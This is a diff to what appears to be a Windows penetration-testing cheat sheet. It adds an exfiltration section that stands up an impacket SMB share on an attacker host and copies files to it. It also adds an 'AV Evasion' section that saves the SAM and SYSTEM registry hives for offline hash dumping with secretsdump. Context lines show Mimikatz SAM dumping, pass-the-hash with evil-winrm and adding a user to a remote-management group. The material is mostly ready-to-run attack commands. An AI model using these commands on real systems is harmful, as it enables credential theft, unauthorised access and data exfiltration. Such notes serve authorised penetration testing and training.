@@ -121,16 +121,27 @@ ____
      net localgroup "Remote Management Users" USERNAME /add  
      pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP
  ____ 
- # Post Exploitation  
+ # Post Exploitation / Exfiltration 
+ [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)  
+     python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS 
+     net use \\IP\share /USER:USER PASS 
+     copy FILE \\IP\share\FILE 
  ## Mimikatz
      privilege::debug 
      token::elevate 
      lsadump::sam  
+     *then crack hashes or use pass the hash to login* 
+ ## AV Evasion 
+     reg.exe save HKLM\SAM sam.bak 
+     reg.exe save HKLM\SYSTEM system.bak 
+     *transfer files to attack box then dump* 
+     python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 
+     
  ____
  
 # Resources
 ## Cheat Sheets and Guides 
-https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts 
+https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts  
 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ 
 ## Learn More
 https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/      
